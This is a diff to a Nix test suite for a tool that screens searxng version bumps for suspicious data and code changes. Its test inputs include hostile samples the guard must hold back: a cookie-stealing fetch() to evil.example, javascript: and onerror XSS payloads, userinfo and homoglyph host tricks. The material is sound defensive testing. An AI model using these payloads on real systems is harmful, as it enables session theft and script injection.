@@ -24,8 +24,13 @@ let
         https://api.github.com/repos/searxng/searxng/compare/*)
           spec=''${url#https://api.github.com/repos/searxng/searxng/compare/}
           spec=''${spec%%\?*}
+          # a whole JSON reply (the step-wise pick's commit list), or a status
+          if [ -r "$STUB/sxcompare/$spec.json" ]; then cat "$STUB/sxcompare/$spec.json"; exit 0; fi
           [ -r "$STUB/sxcompare/$spec" ] || { echo "curl stub: unreachable $spec" >&2; exit 7; }
           printf '{"status": "%s"}\n' "$(cat "$STUB/sxcompare/$spec")"
+          ;;
+        https://api.github.com/repos/searxng/searxng/commits/master)
+          printf '{"sha": "%s"}\n' "$(cat "$STUB/sxmaster")"
           ;;
         *) echo "curl stub: unexpected $*" >&2; exit 2 ;;
       esac
@@ -50,6 +55,25 @@ let
   };
   # the review's diff (nixpkgs-bump-searxng pick), tested at the end
   searxngDiff = import ./searxng-diff.nix { inherit pkgs hermesVenv; };
+  # nixpkgs-bump-searxng itself (pick's step-wise walk), with the stubs:
+  # `nixpkgs-bump-nix flake prefetch` answers $STUB/sxtree/<rev> as the
+  # store path of that rev's tree
+  bumpNix = pkgs.writeShellApplication {
+    name = "nixpkgs-bump-nix";
+    runtimeInputs = [ pkgs.coreutils pkgs.jq ];
+    text = ''
+      [ "$#" = 4 ] && [ "$1 $2 $3" = "flake prefetch --json" ] || { echo "nixpkgs-bump-nix stub: $*" >&2; exit 2; }
+      rev=''${4#github:searxng/searxng/}
+      [ -d "$STUB/sxtree/$rev" ] || { echo "nixpkgs-bump-nix stub: no tree $rev" >&2; exit 1; }
+      jq -n --arg p "$STUB/sxtree/$rev" --arg r "$rev" \
+        '{hash: "sha256-x", storePath: $p, locked: {lastModified: 1, owner: "searxng", repo: "searxng", rev: $r, type: "github"}}'
+    '';
+  };
+  searxngTool = import ./searxng.nix {
+    inherit pkgs hermesVenv curl bumpNix;
+    logDir = "/build/log";
+    decisionInbox = "/build/decisions/inbox.jsonl";
+  };
   guard = import ./guard.nix {
     inherit pkgs nix curl;
     logDir = "/build/log";
@@ -60,6 +84,7 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
     nativeBuildInputs = [
       guard
       searxngDiff
+      searxngTool
       pkgs.git
       pkgs.jujutsu
       pkgs.jq
@@ -575,6 +600,8 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
     fi
     grep -qF '# HELD BACK' "$sd/out" || { echo "FAILED: the review file does not say it is held back"; exit 1; }
     rm "$sd/b/searx/engines/b.py" "$sd/b/searx/d2" "$sd/b/searx/engines/c.py"
+    # (payload.json is no JSON: the summary would hold it on its own)
+    echo '{}' >"$sd/b/searx/data/payload.json"
     nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || {
       cat "$sd/res"
       echo "FAILED: a symlink to counted code held back"
@@ -694,7 +721,8 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
     grep -qF '__HERMES\x5fFENCE_abc__' "$sd/out".part-01 || { echo "FAILED: the fence marker is not visible"; exit 1; }
     sx_ctl latin1 searx/engines/q.py 'x = "\351"\n' 'code diff.s line [0-9]*: invalid UTF-8 (\\xe9)'
     sx_ctl surrogate searx/engines/q.py 'x = "\355\240\200"\n' 'code diff.s line [0-9]*: invalid UTF-8'
-    sx_ctl data-osc searx/data/e.json '{"u": "https://a.example/\033]0;x\a"}\n' 'data diff.s line [0-9]*: an escape sequence'
+    # (raw control bytes in a JSON string: not JSON, the summary holds)
+    sx_ctl data-osc searx/data/e.json '{"u": "https://a.example/\033]0;x\a"}\n' 'searx/data summary: searx/data/e.json is not JSON'
     # TAB and valid UTF-8 are fine
     rm -rf "$sd"
     mkdir -p "$sd/a/searx/engines" "$sd/b/searx/engines"
@@ -703,12 +731,13 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
     nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || { cat "$sd/res"; echo "FAILED: TAB/UTF-8 held back"; exit 1; }
     echo "ok: control bytes, escape sequences, fence markers and invalid UTF-8 held back, shown as \\xNN"
 
-    # size: searx/data comes first after the code, and over 200 KB it is
-    # held back (the review must see all of it); the other uncounted
-    # diff is cut after 200 KB; the parts are one read each
+    # size: the searx/data summary comes first after the code; a raw
+    # searx/data diff over 200 KB is cut (the summary is what counts), a
+    # summary over 200 KB holds; the other uncounted diff is cut after
+    # 200 KB; the parts are one read each
     sd=$TMPDIR/sxsize
     mkdir -p "$sd/a/searx/data" "$sd/b/searx/data" "$sd/b/searx/engines" "$sd/b/searx/static"
-    for i in $(seq 1 6000); do echo "\"k$i\": \"https://example.org/search?q={query}&n=$i\","; done >"$sd/b/searx/data/big.json"
+    { echo '{'; for i in $(seq 1 6000); do echo "\"k$i\": \"https://example.org/search?q={query}&n=$i\","; done; echo '"z": 0}'; } >"$sd/b/searx/data/big.json"
     for i in $(seq 1 6000); do echo "\"node_modules/p$i\": {\"version\": \"1.0.$i\", \"resolved\": \"x\"},"; done >"$sd/b/searx/static/package-lock.json"
     for i in $(seq 1 3000); do echo "x$i = $i"; done >"$sd/b/searx/engines/many.py"
     head -c 200000 /dev/zero | tr '\0' 'a' >"$sd/b/searx/engines/long.py"
@@ -717,34 +746,278 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
     nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
     read -r lines bytes <"$sd/res"
     [ "$bytes" -gt 200000 ] && [ "$lines" -gt 3000 ] || { echo "FAILED: sizes $lines $bytes"; exit 1; }
-    [ "$rc" = 3 ] && grep -q '^HOLD the searx/data diff is [0-9]* bytes, over ' "$sd/res" || {
+    [ "$rc" = 3 ] && grep -q '^HOLD the searx/data summary is [0-9]* bytes, over ' "$sd/res" || {
       cat "$sd/res"
-      echo "FAILED: a cut searx/data diff was not held back (exit $rc)"
+      echo "FAILED: a cut searx/data summary was not held back (exit $rc)"
       exit 1
     }
-    grep -q "^# --- TRUNCATED: the searx/data diff's first 200000 bytes" "$sd/out" &&
+    grep -q "^# --- TRUNCATED: the searx/data summary's first 200000 bytes" "$sd/out" &&
+      grep -q "^# --- TRUNCATED: the searx/data diff's first 200000 bytes" "$sd/out" &&
       grep -q "^# --- TRUNCATED: the other uncounted diff's first 200000 bytes" "$sd/out" || {
       echo "FAILED: the uncounted diffs are not cut"
       exit 1
     }
-    # searx/data right after the code, before package-lock.json
-    order=$(grep -n -e '^# --- end of the code diff$' -e '^# --- the searx/data diff ' -e '^# --- the other uncounted diff ' "$sd/out" | cut -d: -f1 | paste -sd ' ')
-    read -r o1 o2 o3 <<<"$order"
-    [ "$o1" -lt "$o2" ] && [ "$o2" -lt "$o3" ] || { echo "FAILED: searx/data is not first after the code ($order)"; exit 1; }
-    [ "$(wc -c <"$sd/out")" -lt $((bytes + 400000 + 20000)) ] || { echo "FAILED: the review file is too big"; exit 1; }
+    # the summary right after the code, then the raw data, then the rest
+    order=$(grep -n -e '^# --- end of the code diff$' -e '^# --- the searx/data summary ' -e '^# --- the searx/data diff ' -e '^# --- the other uncounted diff ' "$sd/out" | cut -d: -f1 | paste -sd ' ')
+    read -r o1 o2 o3 o4 <<<"$order"
+    [ "$o1" -lt "$o2" ] && [ "$o2" -lt "$o3" ] && [ "$o3" -lt "$o4" ] || { echo "FAILED: the summary is not first after the code ($order)"; exit 1; }
+    [ "$(wc -c <"$sd/out")" -lt $((bytes + 600000 + 20000)) ] || { echo "FAILED: the review file is too big"; exit 1; }
     parts_ok "$sd/out"
     [ "$nparts" -ge 3 ] || { echo "FAILED: only $nparts parts"; exit 1; }
-    # the other uncounted diff alone over 200 KB: cut, not held
-    rm "$sd/b/searx/data/big.json"
+    # a one-line 400 KB searx/data file with one value changed: the raw
+    # diff is over 200 KB (cut), the summary one value, nothing held
+    { printf '{'; for i in $(seq 1 20000); do printf '"k%s": "a name %s", ' "$i" "$i"; done; echo '"z": 0}'; } >"$sd/a/searx/data/big.json"
+    sed 's/"k7": "a name 7"/"k7": "a name seven"/' "$sd/a/searx/data/big.json" >"$sd/b/searx/data/big.json"
+    rm "$sd/b/searx/engines/many.py" "$sd/b/searx/engines/long.py"
     nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || {
       cat "$sd/res"
-      echo "FAILED: a cut package-lock.json diff held back"
+      echo "FAILED: a big one-value searx/data change held back"
       exit 1
     }
-    grep -q "^# --- TRUNCATED: the other uncounted diff's" "$sd/out" &&
-      grep -q '^# --- end of the searx/data diff$' "$sd/out" || { echo "FAILED: package-lock.json not cut"; exit 1; }
+    grep -qxF '## searx/data/big.json (changed; every changed value): keys 20001 -> 20001, strings 20000 -> 20000, host strings 0 -> 0' "$sd/out" &&
+      grep -qxF '~ /k7 = "a name 7" -> "a name seven"' "$sd/out" &&
+      grep -q "^# --- TRUNCATED: the searx/data diff's first 200000 bytes" "$sd/out" &&
+      grep -q "^# --- TRUNCATED: the other uncounted diff's" "$sd/out" &&
+      grep -q '^# --- end of the searx/data summary$' "$sd/out" || { echo "FAILED: summary or cuts wrong"; exit 1; }
     parts_ok "$sd/out"
-    echo "ok: the searxng review file in $nparts readable parts; a cut searx/data diff held, the rest cut"
+    echo "ok: the searxng review file in $nparts readable parts; a cut searx/data summary held, the raw diffs cut"
+
+    # (1) searx/data: the raw diff is the review's view while it fits
+    # (200 KB); only above it the summary stands in (every changed or
+    # added value of every file by path, whatever its size or name).
+    # `pad` adds a one-line 400 KB file with one value changed, so the
+    # raw diff is over the cap and the summary is what counts. URL checks
+    # hold in both.
+    sx_data() { # name [pad]; old and new json from $1.old, $1.new (file ''${F:-e.json})
+      rm -rf "$sd"
+      mkdir -p "$sd/a/searx/data" "$sd/b/searx/data" "$sd/a/searx/engines" "$sd/b/searx/engines"
+      echo 'x=1' >"$sd/a/searx/engines/q.py"
+      echo 'x=1' >"$sd/b/searx/engines/q.py"
+      mkdir -p "$(dirname "$sd/a/searx/data/''${F:-e.json}")" "$(dirname "$sd/b/searx/data/''${F:-e.json}")"
+      cp "$TMPDIR/$1.old" "$sd/a/searx/data/''${F:-e.json}"
+      cp "$TMPDIR/$1.new" "$sd/b/searx/data/''${F:-e.json}"
+      if [ "''${2:-}" = pad ]; then
+        { printf '{'; for i in $(seq 1 20000); do printf '"k%s": "a name %s", ' "$i" "$i"; done; echo '"v": 1}'; } >"$sd/a/searx/data/pad.json"
+        sed 's/"v": 1}$/"v": 2}/' "$sd/a/searx/data/pad.json" >"$sd/b/searx/data/pad.json"
+      fi
+      rc=0
+      nixpkgs-bump-searxng-diff "$sd/a" "$sd/b" "$sd/out" test >"$sd/res" || rc=$?
+      parts_ok "$sd/out"
+      summary=$(sed -n '/^# --- the searx\/data summary /,/^# --- end of the searx\/data summary$/p' "$sd/out")
+      hosts=$(sed -n '/^# --- the searx\/data hosts /,/^# --- end of the searx\/data hosts$/p' "$sd/out")
+    }
+    want_in() { # text want...
+      local t=$1 w
+      shift
+      for w in "$@"; do
+        grep -qxF -- "$w" <<<"$t" || { echo "$t"; echo "FAILED: lacks: $w"; exit 1; }
+      done
+    }
+    held() { # name grep-E
+      [ "$rc" = 3 ] && grep -qE "^HOLD the searx/data summary: $2" "$sd/res" || { cat "$sd/res"; echo "FAILED: $1 not held (exit $rc)"; exit 1; }
+    }
+    printf '{"g": {"base_url": "https://www.google.com/search?q={q}", "domains": ["www.google.de"]}, "d": "a name"}\n' >"$TMPDIR/s1.old"
+    printf '{"g": {"base_url": "https://www.example.co.uk/search?q={q}", "domains": ["www.google.de", "www.evil.example.org"], "x": "https://new.example.net/c"}, "d": "a name, and more https://cdn.example.com/x."}\n' >"$TMPDIR/s1.new"
+    # raw: the whole diff, nothing summarised, the domains before it
+    sx_data s1
+    [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: a normal searx/data change held back"; exit 1; }
+    [ -z "$summary" ] && grep -q '^# --- the searx/data diff ([0-9]* bytes, raw, whole' "$sd/out" &&
+      grep -qxF '+{"g": {"base_url": "https://www.example.co.uk/search?q={q}", "domains": ["www.google.de", "www.evil.example.org"], "x": "https://new.example.net/c"}, "d": "a name, and more https://cdn.example.com/x."}' "$sd/out" || {
+      cat "$sd/out"; echo "FAILED: a searx/data diff under the cap is not shown raw and whole"; exit 1
+    }
+    want_in "$hosts" '  new registrable domains: example.co.uk example.com example.net example.org' '  gone registrable domains: google.com'
+    # summary: every changed value by path, URLs with urllib.parse's host
+    sx_data s1 pad
+    [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: a padded searx/data change held back"; exit 1; }
+    want_in "$summary" \
+      '~ /g/base_url = "https://www.google.com/search?q={q}"  [host www.google.com] -> "https://www.example.co.uk/search?q={q}"  [host www.example.co.uk]' \
+      '+ /g/domains[1] = "www.evil.example.org"' '+ /g/x = "https://new.example.net/c"  [host new.example.net]' \
+      '~ /d = "a name" -> "a name, and more https://cdn.example.com/x."' \
+      '  new registrable domains: example.co.uk example.com example.net example.org' '  gone registrable domains: google.com'
+    grep -q "^# --- TRUNCATED: the searx/data diff's first 200000 bytes" "$sd/out" || { echo "FAILED: the raw diff over the cap not cut"; exit 1; }
+    # the reviewer's probes (rv9x): engine_traits' wiki_netloc to netlocs
+    # that are no public-suffix hosts, a userinfo trick, a boolean, a
+    # regex, a region code spliced into a URL: each shown old -> new
+    printf '{"wikipedia": {"custom": {"wiki_netloc": {"en": "en.wikipedia.org", "de": "de.wikipedia.org", "fr": "fr.wikipedia.org", "it": "it.wikipedia.org"}}, "regions": {"de": "de-de"}, "safe": true, "re": "^[a-z]+$"}}\n' >"$TMPDIR/s4.old"
+    printf '{"wikipedia": {"custom": {"wiki_netloc": {"en": "evil.com", "de": "10.0.0.5", "fr": "nas", "it": "it.wikipedia.org"}}, "regions": {"de": "de-de&callback=x"}, "safe": false, "re": "^.*$"}}\n' >"$TMPDIR/s4.new"
+    for m in "" pad; do
+      F=engine_traits.json sx_data s4 $m
+      [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: the wiki_netloc probe held ($m)"; exit 1; }
+      want_in "$hosts$summary" '  new registrable domains: 10.0.0.5 evil.com'
+    done
+    want_in "$summary" \
+      '~ /wikipedia/custom/wiki_netloc/en = "en.wikipedia.org" -> "evil.com"' \
+      '~ /wikipedia/custom/wiki_netloc/de = "de.wikipedia.org" -> "10.0.0.5"' \
+      '~ /wikipedia/custom/wiki_netloc/fr = "fr.wikipedia.org" -> "nas"' \
+      '~ /wikipedia/regions/de = "de-de" -> "de-de&callback=x"' \
+      '~ /wikipedia/safe = true -> false' '~ /wikipedia/re = "^[a-z]+$" -> "^.*$"'
+    sed -i 's/"it": "it.wikipedia.org"}}, "regions": {"de": "de-de&/"it": "en.wikipedia.org@evil.com"}}, "regions": {"de": "de-de\&/' "$TMPDIR/s4.new"
+    for m in "" pad; do
+      F=engine_traits.json sx_data s4 $m
+      held "a netloc with userinfo ($m)" "searx/data/engine_traits.json: '/wikipedia/custom/wiki_netloc/it': a host with userinfo"
+    done
+    want_in "$summary" '~ /wikipedia/custom/wiki_netloc/it = "it.wikipedia.org" -> "en.wikipedia.org@evil.com"'
+    # a big file (over 300 KB): every changed value too, host or not
+    { echo '{"trie": {'; for i in $(seq 1 12000); do echo "\"b$i\": \"https://www.site$i.example/s?q=\\u0002\\u00010\","; done; echo '"g": "https://www.google.com/search?q=\u0002\u00010"}, "version": 1}'; } >"$TMPDIR/s5.old"
+    sed 's|"g": "https://www.google.com/search?q=\\u0002\\u00010"|"g": "nas"|; s|"version": 1|"version": 2|' "$TMPDIR/s5.old" >"$TMPDIR/s5.new"
+    F=external_bangs.json sx_data s5 pad
+    [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: a big bangs change held"; exit 1; }
+    want_in "$summary" '~ /trie/g = "https://www.google.com/search?q=\u0002\u00010"  [host www.google.com] -> "nas"'
+    want_in "$summary" '~ /version = 1 -> 2'
+    # the reviewer's probes (rv10): every value of a big bangs file is
+    # shown (nas, localhost, a netloc), every URL shape that is not
+    # exactly http(s):// or // + a plain host is held
+    { echo '{"trie": {'; for i in $(seq 1 12000); do echo "\"b$i\": \"https://www.site$i.example/s?q=\\u0002\\u00010\","; done
+      echo '"g": "https://www.google.com/search?q=\u0002\u00011"}, "old_plain": "hello"}'; } >"$TMPDIR/s7.old"
+    python3 - "$TMPDIR/s7.old" "$TMPDIR/s7.new" <<'PY'
+    import json, sys
+    d = json.load(open(sys.argv[1]))
+    d["old_plain"] = "nas"
+    d["trie"].update({"n": "nas", "i": "10.0.0.5:80", "lh": "localhost", "ok1": "HTTPS://Good.example/?q=\x02",
+                      "ok2": "//good.example/s?q=\x02\x013"})
+    bad = {"up_bs": "HTTPS:\\\\evil.com/", "bs": "https:\\\\evil.com/?q=\x02", "oneslash": "https:/evil.com/",
+           "noslash": "https:evil.com/?q=\x02", "js": "javascript:alert(1)//\x02", "data": "data:text/html,x",
+           "ws": " https://evil.com/", "tab": "\thttps://evil.com/", "ctl": "\x01https://evil.com/",
+           "hostport": "nas:8080", "ui": "https://a.example@evil.com/",
+           "pct": "https://evil%2ecom/", "ipv6": "https://[::1]:80/", "dec": "https://2130706433/",
+           "dot": "https://google.com./", "idn": "https://\u043f\u0440\u0438\u043c\u0435\u0440.\u0440\u0444/",
+           "bsl": "\\\\evil.com/x", "ftp": "ftp://evil.com/", "inner": "https://x.example/\t@x"}
+    d["trie"].update(bad)
+    json.dump(d, open(sys.argv[2], "w"), indent=1)
+    open(sys.argv[2] + ".bad", "w").write("\n".join(bad))
+    PY
+    F=external_bangs.json sx_data s7
+    [ "$rc" = 3 ] || { cat "$sd/res"; echo "FAILED: rv10 URL shapes not held"; exit 1; }
+    for k in $(cat "$TMPDIR/s7.new.bad"); do
+      grep -qF "HOLD the searx/data summary: searx/data/external_bangs.json: '/trie/$k': " "$sd/res" || { cat "$sd/res"; echo "FAILED: the URL shape $k not held"; exit 1; }
+    done
+    for k in ok1 ok2 g n i lh; do
+      grep -qF "'/trie/$k'" "$sd/res" && { cat "$sd/res"; echo "FAILED: $k held"; exit 1; }
+    done
+    F=external_bangs.json sx_data s7 pad
+    want_in "$summary" '~ /old_plain = "hello" -> "nas"' '+ /trie/n = "nas"' '+ /trie/i = "10.0.0.5:80"' '+ /trie/lh = "localhost"' \
+      '+ /trie/ok1 = "HTTPS://Good.example/?q=\u0002"  [host Good.example]'
+    # the same shapes outside external_bangs.json: `//host` and \x02 hold too
+    F=external_urls.json sx_data s7
+    for k in ok1 ok2; do
+      grep -qF "HOLD the searx/data summary: searx/data/external_urls.json: '/trie/$k': " "$sd/res" || { cat "$sd/res"; echo "FAILED: $k outside bangs not held"; exit 1; }
+    done
+    # the real data's non-URL forms pass where they occur, hold elsewhere
+    printf '{"en": {"bing": "x", "bing images": ["x", "ref"]}, "gl": {"wikibooks": "x"}}\n' >"$TMPDIR/s8.old"
+    printf '{"en": {"bing": "x", "bing images": ["bing:en", "ref"]}, "gl": {"wikibooks": "Modelo:Dominio Wikilibros e un proxecto"}}\n' >"$TMPDIR/s8.new"
+    F=engine_descriptions.json sx_data s8
+    [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: engine_descriptions' own forms held"; exit 1; }
+    F=engine_traits.json sx_data s8
+    held "an engine reference outside engine_descriptions" "searx/data/engine_traits.json: '/en/bing images\\[0\\]': a URL that is not exactly"
+    printf '{"google news": {"custom": {"ceid": {"de-DE": "x"}}}, "arch linux wiki": {"custom": {"title": {"de": "x"}}}}\n' >"$TMPDIR/s9.old"
+    printf '{"google news": {"custom": {"ceid": {"de-DE": "DE:de"}}}, "arch linux wiki": {"custom": {"title": {"de": "Spezial:Suche"}}}}\n' >"$TMPDIR/s9.new"
+    F=engine_traits.json sx_data s9
+    [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: engine_traits' own forms held"; exit 1; }
+    printf '{"google news": {"custom": {"ceid": {"de-DE": "javascript:x"}}}, "arch linux wiki": {"custom": {"title": {"de": "https:evil.com"}}}}\n' >"$TMPDIR/s9.new"
+    F=engine_traits.json sx_data s9
+    held "javascript: at ceid" "searx/data/engine_traits.json: '/google news/custom/ceid/de-DE': "
+    held "https: at title" "searx/data/engine_traits.json: '/arch linux wiki/custom/title/de': "
+    # display-only files (engine_descriptions, wikidata_properties): no
+    # values shown, counts only; a URL or a structure change holds
+    printf '{"en": {"bing": "Bing is a search engine.", "gentoo": ["Gentoo wiki", "https://wiki.gentoo.org/"]}, "de": {"bing": ["bing:en", "ref"]}}\n' >"$TMPDIR/s10.old"
+    printf '{"en": {"bing": "Bing is a web search engine by Microsoft.", "gentoo": ["Gentoo wiki", "https://wiki.gentoo.org/"], "yep": ["Yep", "https://yep.com/"]}, "de": {"bing": ["bing:en", "ref"]}}\n' >"$TMPDIR/s10.new"
+    F=engine_descriptions.json sx_data s10 pad
+    [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: a plain engine description change held"; exit 1; }
+    grep -q 'by Microsoft' <<<"$summary" && { echo "$summary"; echo "FAILED: a display-only value shown"; exit 1; }
+    want_in "$summary" \
+      '## searx/data/engine_descriptions.json (changed; display-only: counts, URL and structure checks, no values): keys 5 -> 6, strings 5 -> 7' \
+      '  keys added 1, removed 0; strings added 2, changed 1, removed 0' \
+      '  source links (`Source:` text) to 1 registrable domains: yep.com'
+    for v in 'see https://evil.example/x' 'javascript:alert(1)' '//evil.example/' 'https://evil.example/'; do
+      printf '{"en": {"bing": "%s", "gentoo": ["Gentoo wiki", "https://wiki.gentoo.org/"]}, "de": {"bing": ["bing:en", "ref"]}}\n' "$v" >"$TMPDIR/s10.new"
+      F=engine_descriptions.json sx_data s10 pad
+      case $v in
+        see*) [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: a URL in prose held ($v)"; exit 1; }
+              want_in "$summary" '  URLs inside new or changed prose (plain text on the page) name: evil.example' ;;
+        *) held "a URL in an engine description ($v)" "searx/data/engine_descriptions.json: '/en/bing': a URL in a display-only file" ;;
+      esac
+    done
+    printf '{"en": {"bing": "a <img src=x onerror=alert(1)> b", "gentoo": ["Gentoo wiki", "https://wiki.gentoo.org/"]}, "de": {"bing": ["bing:en", "ref"]}}\n' >"$TMPDIR/s10.new"
+    F=engine_descriptions.json sx_data s10
+    held "HTML in an engine description" "searx/data/engine_descriptions.json: '/en/bing': a \`<\` or \`>\`"
+    printf '{"en": {"bing": "Bing", "gentoo": ["Gentoo wiki", "javascript:x"]}, "de": {"bing": ["bing:en", "ref"]}}\n' >"$TMPDIR/s10.new"
+    F=engine_descriptions.json sx_data s10 pad
+    held "a bad source link" "searx/data/engine_descriptions.json: '/en/gentoo\\[1\\]': a URL in a display-only file"
+    printf '{"en": {"bing": {"url": "x"}, "gentoo": ["Gentoo wiki", "https://wiki.gentoo.org/"]}, "de": {"bing": ["bing:en", "ref"]}}\n' >"$TMPDIR/s10.new"
+    F=engine_descriptions.json sx_data s10 pad
+    held "a structure change in engine_descriptions" "searx/data/engine_descriptions.json: its structure changed"
+    printf '{"P1": {"en": "crew", "de": "Crew"}, "Q2": "km"}\n' >"$TMPDIR/s11.old"
+    printf '{"P1": {"en": "crew members", "de": "Crew"}, "Q2": "km", "Q3": "m"}\n' >"$TMPDIR/s11.new"
+    F=wikidata_properties.json sx_data s11 pad
+    [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: a plain wikidata label change held"; exit 1; }
+    grep -q 'crew members' <<<"$summary" && { echo "FAILED: a wikidata label shown"; exit 1; }
+    want_in "$summary" '  keys added 1, removed 0; strings added 1, changed 1, removed 0'
+    printf '{"P1": {"en": "crew", "de": ["Crew"]}, "Q2": "km"}\n' >"$TMPDIR/s11.new"
+    F=wikidata_properties.json sx_data s11 pad
+    held "a structure change in wikidata_properties" "searx/data/wikidata_properties.json: its structure changed"
+    printf '{"P1": {"en": "https://evil.example/", "de": "Crew"}, "Q2": "km"}\n' >"$TMPDIR/s11.new"
+    F=wikidata_properties.json sx_data s11 pad
+    held "a URL in a wikidata label" "searx/data/wikidata_properties.json: '/P1/en': a URL in a display-only file"
+    # only the exact paths: the same name in a subdirectory shows its values
+    F=x/engine_descriptions.json sx_data s10 pad
+    grep -qxF '+ /en/bing/url = "x"' <<<"$summary" || { echo "$summary"; echo "FAILED: a non-exact path treated as display-only"; exit 1; }
+    echo "ok: display-only searx/data files: counts only, URLs, HTML and structure changes held"
+    # (2) a bang whose authority hides another host (urllib.parse:
+    # evil.com): held, the whole string shown with that host
+    sed 's|"g": "nas"|"g": "https://www.google.com'"'"'@evil.com/search?q=\\u0002\\u00010"|' "$TMPDIR/s5.new" >"$TMPDIR/s6.new"
+    cp "$TMPDIR/s5.old" "$TMPDIR/s6.old"
+    F=external_bangs.json sx_data s6 pad
+    held "a quote and @ in a bang's authority" "searx/data/external_bangs.json: '/trie/g': a URL whose authority is no plain host"
+    grep -qF "(urllib.parse: 'evil.com')" "$sd/res" &&
+      # (the new value is a span hermes' redactor rewrites: written
+      # escaped, \xNN per character, the shown host after it as is)
+      grep -qE '^~ /trie/g = "https://www\.google\.com/search\?q=.*"  \[host www\.google\.com\] -> \\x22\\x68.*\\x27\\x40\\x65\\x76\\x69\\x6c.*  \[host evil\.com\]$' <<<"$summary" || {
+      cat "$sd/res"; echo "FAILED: the bang's real host is not shown"; exit 1
+    }
+    for bad in 'https://a.example\" onclick=x/' 'https://a.example@b.example/' 'https://a.example\\\\@b.example/'; do
+      printf '{"u": "%s"}\n' "$bad" >"$TMPDIR/s3.new"
+      echo '{"u": "https://a.example/"}' >"$TMPDIR/s3.old"
+      sx_data s3
+      held "the authority $bad" "searx/data/e.json: '/u': a URL whose authority"
+    done
+    # the URL must be the whole string: a control after it holds, the
+    # bang tail is allowed in external_bangs.json only
+    printf '{"u": "https://x.example/$1"}\n' >"$TMPDIR/s3.old"
+    printf '{"u": "https://x.example/$1\\u0002\\u00010"}\n' >"$TMPDIR/s3.new"
+    F=external_urls.json sx_data s3
+    held "a bang tail outside external_bangs.json" "searx/data/external_urls.json: '/u': a URL with U\+0002 in it"
+    printf '{"u": "https://x.example/s?q=\\u0002\\u00010\\u0003junk"}\n' >"$TMPDIR/s3.new"
+    F=external_bangs.json sx_data s3
+    held "junk after the bang tail" "searx/data/external_bangs.json: '/u': a URL with U\+0001 in it"
+    printf '{"u": "https://x.example/s?q=\\u0002 x\\u00010", "w": "//\\u0002.rtfd.io\\u00011"}\n' >"$TMPDIR/s3.new"
+    F=external_bangs.json sx_data s3
+    [ "$rc" = 0 ] || { cat "$sd/res"; echo "FAILED: a normal bang (space in the query, \\x02 in the host) held"; exit 1; }
+    printf '{"u": "https://a.example/\\u001b]0;x\\u0007"}\n' >"$TMPDIR/s3.new"
+    sx_data s3
+    held "a control character in a URL" "searx/data/e.json: '/u': a URL with U\+001B in it"
+    # a Cyrillic o in a URL is spelled out; in a host whose label mixes
+    # scripts (also as punycode) it holds
+    printf '{"u": "https://www.google.com/"}\n' >"$TMPDIR/s2.old"
+    printf '{"u": "https://www.goo\xd0\xbegle.com/?q={q}"}\n' >"$TMPDIR/s2.new"
+    sx_data s2 pad
+    held "a mixed-script host" "searx/data/e.json: the host .* mixes scripts"
+    grep -qF -- "$(printf '~ /u = "https://www.google.com/"  [host www.google.com] -> "https://www.goo\xd0\xbe%sgle.com/?q={q}"' '\u{043E}')" <<<"$summary" &&
+      grep -qF -- "$(printf '  new registrable domains: goo\xd0\xbe%sgle.com' '\u{043E}')" <<<"$summary" || {
+      echo "$summary"; echo "FAILED: the Cyrillic o is not spelled out"; exit 1
+    }
+    printf '{"u": "https://www.xn--ggle-55da.com/"}\n' >"$TMPDIR/s2.new"
+    sx_data s2
+    held "a mixed-script punycode host" "searx/data/e.json: the host .* mixes scripts"
+    # a whole non-Latin host holds too (no IDN in upstream's data)
+    printf '{"u": "https://\xd0\xbf\xd1\x80\xd0\xb8\xd0\xbc\xd0\xb5\xd1\x80.\xd1\x80\xd1\x84/"}\n' >"$TMPDIR/s2.new"
+    sx_data s2
+    held "a Cyrillic host" "searx/data/e.json: '/u': a URL whose authority is no plain"
+    # not JSON: the summary cannot read it
+    printf '{"u": 1}\n' >"$TMPDIR/s3.old"
+    printf '{"u": "https://evil.example/", oops\n' >"$TMPDIR/s3.new"
+    sx_data s3
+    held "a searx/data file that is not JSON" "searx/data/e.json is not JSON"
+    echo "ok: searx/data: raw diff under the cap, every changed value of every file above it; URL candidates not exactly http(s):// + a plain host (rv10 shapes), userinfo, controls, bang forms outside external_bangs, mixed-script hosts and non-JSON held"
 
     # Round 7: every part goes through the reviewer's own read_file (the
     # hermes infra-space runs); whatever it shows differently is held.
@@ -797,9 +1070,6 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
       sx_read bearer searx/engines/k.py "$rp a change"
     printf 't = "%s"\n' "$ghp" |
       sx_read ghp-token searx/engines/k.py "$rp a secret redaction"
-    # in searx/data too (not counted, but the review reads it)
-    printf '{"u": "https://user:pa55word@evil.example/"}\n' |
-      sx_read data-userinfo searx/data/e.json "$rp a change"
     # N2: a line separator in JavaScript ends the line there (the diff
     # shows one line); N3: bidi controls reorder what the review reads
     printf 'var a = 1;\xe2\x80\xa8fetch("https://evil.example/"+document.cookie)\n' |
@@ -848,8 +1118,10 @@ pkgs.runCommand "nixpkgs-bump-guard-test"
     sx_code nbsp '\xc2\xa0' U+00A0
     sx_code ideographic-space '\xe3\x80\x80' U+3000
     sx_code fullwidth-a '\xef\xbd\x81' U+FF41
-    sx_code one-dot-leader '\xe2\x80\xa4' U+2024
     sx_code micro-sign '\xc2\xb5' U+00B5
+    sx_code superscript-i '\xe2\x81\xb1' U+2071
+    sx_code roman-one '\xe2\x85\xa0' U+2160
